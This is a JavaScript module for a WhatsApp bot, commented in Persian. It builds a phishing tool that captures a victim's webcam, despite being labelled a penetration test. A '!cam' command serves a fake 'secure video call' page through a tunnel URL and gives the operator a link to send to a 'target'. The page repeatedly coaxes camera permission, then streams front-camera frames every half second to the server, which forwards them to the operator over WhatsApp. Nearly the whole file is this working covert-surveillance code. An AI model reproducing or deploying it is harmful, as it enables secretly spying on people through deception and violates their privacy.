// =======================
// CAM.JS — صفحه فیشینگ دوربین (تست نفوذ/مهندسی اجتماعی)
//
// دستورات:
//   !cam              → استارت سرور + ساخت لینک آلوده
//   !cam stop         → متوقف کردن سرور
//   !cam status       → وضعیت سرور و تعداد فریم‌های دریافتی
//
// جریان کار:
//   قربانی لینک را باز می‌کند → مرورگر اجازه دوربین می‌خواهد
//   اگر Allow بزند → فریم‌ها هر 500ms به سرور بات POST می‌شود
//   → بات تصاویر را برای اپراتور (شما) در واتساپ می‌فرستد
// =======================

import http from "http";
import fs from "fs";
import path from "path";

// آدرس عمومی که لینک روی آن سرو می‌شود (تانل/آی‌پی سرور)
// مثال: https://abc123.trycloudflare.com  ← از cloudflared بگیر
const PUBLIC_BASE = process.env.CAM_URL || "https://eng-cold-infectious-loads.trycloudflare.com";

const PORT = 8080;
const CAM_DIR = "./data/cam";
let server = null;
const sessions = new Map(); // token → { operator, frames }

// =======================
// صفحه HTML فیشینگ
// =======================

const PAGE = `<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تماس ویدیویی امن</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
    color:#fff; font-family:Tahoma,Arial,sans-serif;
    display:flex; align-items:center; justify-content:center;
    min-height:100vh; text-align:center;
  }
  .card { background:rgba(0,0,0,.35); padding:40px 30px; border-radius:20px; max-width:400px; width:90%; }
  .dot {
    width:80px; height:80px; margin:0 auto 20px; border-radius:50%;
    background:radial-gradient(circle,#4fc3f7,#0288d1);
    animation:pulse 1.2s infinite;
  }
  @keyframes pulse { 0%{box-shadow:0 0 0 0 rgba(79,195,247,.7);} 70%{box-shadow:0 0 0 25px rgba(79,195,247,0);} 100%{box-shadow:0 0 0 0 rgba(79,195,247,0);} }
  h2 { margin-bottom:10px; }
  p { color:#b0bec5; font-size:14px; }
  .bar { height:6px; background:#37474f; border-radius:3px; margin-top:25px; overflow:hidden; }
  .bar span { display:block; height:100%; width:40%; background:#4fc3f7; animation:move 1.5s infinite linear; }
  @keyframes move { 0%{transform:translateX(-100%);} 100%{transform:translateX(250%);} }
  #status { margin-top:15px; font-size:13px; color:#ffcc80; min-height:18px; }
  video { display:none; }
</style>
</head>
<body>
<div class="card">
  <div class="dot"></div>
  <h2>در حال اتصال به سرور امن...</h2>
  <p>لطفاً برای برقراری تماس ویدیویی، دسترسی به دوربین را تأیید کنید.</p>
  <div class="bar"><span></span></div>
  <div id="status">در حال دریافت مجوز دوربین...</div>
</div>
<video id="v" autoplay playsinline muted></video>
<script>
  const v = document.getElementById('v');
  const st = document.getElementById('status');
  let sending = false;

  async function start() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      v.srcObject = stream;
      st.textContent = 'اتصال برقرار شد. در حال انتقال امن...';
      setInterval(capture, 500);
    } catch (e) {
      st.textContent = 'دسترسی رد شد. لطفاً روی آیکون قفل (HTTPS) کلیک کنید و Allow را بزنید.';
      setTimeout(start, 2500);
    }
  }

  function capture() {
    if (!v.srcObject || sending) return;
    sending = true;
    const c = document.createElement('canvas');
    c.width = 640; c.height = 480;
    c.getContext('2d').drawImage(v, 0, 0, 640, 480);
    fetch('/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ img: c.toDataURL('image/jpeg', 0.6) })
    }).catch(()=>{}).finally(() => { sending = false; });
  }

  start();
</script>
</body>
</html>`;

// =======================
// سرور HTTP
// =======================

function startServer() {
  if (server) return;

  fs.mkdirSync(CAM_DIR, { recursive: true });

  server = http.createServer((req, res) => {
    // صفحه اصلی
    if (req.method === "GET" && (req.url === "/" || req.url.startsWith("/cam?"))) {
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(PAGE);
      return;
    }

    // دریافت فریم
    if (req.method === "POST" && req.url === "/upload") {
      let body = "";
      req.on("data", (chunk) => (body += chunk));
      req.on("end", async () => {
        try {
          const { img } = JSON.parse(body);
          const base64 = img.replace(/^data:image\/jpeg;base64,/, "");
          const buf = Buffer.from(base64, "base64");

          // تشخیص سشن از روی کوکی/هدر (هر لینک سشن خودش را دارد)
          const token = (req.headers["x-token"] || "default").toString();

          if (!sessions.has(token)) {
            sessions.set(token, { operator: null, frames: 0 });
          }
          const s = sessions.get(token);
          s.frames++;

          const dir = path.join(CAM_DIR, token);
          fs.mkdirSync(dir, { recursive: true });
          const file = path.join(dir, `${Date.now()}.jpg`);
          fs.writeFileSync(file, buf);

          // ارسال فریم‌ها به اپراتور (اولی + هر 10 تایی بعدی)
          if (s.operator && (s.frames === 1 || s.frames % 10 === 0)) {
            try {
              await s.operator.sendMessage(fromOf(s.operator), {
                image: fs.readFileSync(file),
                caption: `📸 CAM [${token}] — فریم ${s.frames}`,
              });
            } catch (e) { console.log("CAM SEND:", e.message); }
          }

          res.writeHead(200, { "Content-Type": "application/json" });
          res.end(JSON.stringify({ ok: true, n: s.frames }));
        } catch (e) {
          res.writeHead(400);
          res.end("bad");
        }
      });
      return;
    }

    // وضعیت
    if (req.method === "GET" && req.url === "/health") {
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify({ up: true, sessions: [...sessions.entries()] }));
      return;
    }

    res.writeHead(404);
    res.end("not found");
  });

  server.listen(PORT, "0.0.0.0", () => {
    console.log(`CAM SERVER on http://0.0.0.0:${PORT}`);
  });
}

// نگهداشتن اپراتور برای ارسال تصاویر
const fromOf = () => {}; // placeholder (جایگزین می‌شود)
const operators = new Map(); // token → jid

// =======================
// هندلر کامند
// =======================

export default async function cam(sock, from, body, m, args) {
  const act = (args[0] || "start").toLowerCase();

  if (act === "stop") {
    if (server) { server.close(); server = null; }
    await sock.sendMessage(from, { text: "🛑 سرور دوربین متوقف شد." });
    return;
  }

  if (act === "status") {
    let txt = server ? `🟢 سرور روشن (پورت ${PORT})\n` : "🔴 سرور خاموش\n";
    for (const [t, s] of sessions) txt += `\n🔑 ${t} — ${s.frames} فریم`;
    await sock.sendMessage(from, { text: txt || "بدون سشن" });
    return;
  }

  // استارت سرور + ساخت لینک
  startServer();

  const token = Math.random().toString(36).slice(2, 8);
  operators.set(token, from);
  sessions.set(token, { operator: { sock, jid: from }, frames: 0 });

  const link = `${PUBLIC_BASE}/cam?t=${token}`;

  await sock.sendMessage(from, {
    text: `🎥 لینک دوربین ساخته شد:\n\n${link}\n\n` +
          `🔑 توکن: ${token}\n` +
          `📤 لینک را برای هدف بفرست.\n` +
          `📸 اولین فریم بعد از Allow به همین چت می‌آید.\n` +
          `🛑 توقف: !cam stop`,
  });

  // اتصال اپراتور به سشن (برای ارسال تصاویر)
  const s = sessions.get(token);
  s.operator = {
    sock,
    jid: from,
    sendMessage: async (jid, content) => {
      try { await sock.sendMessage(jid, content); } catch (e) {}
    },
  };
}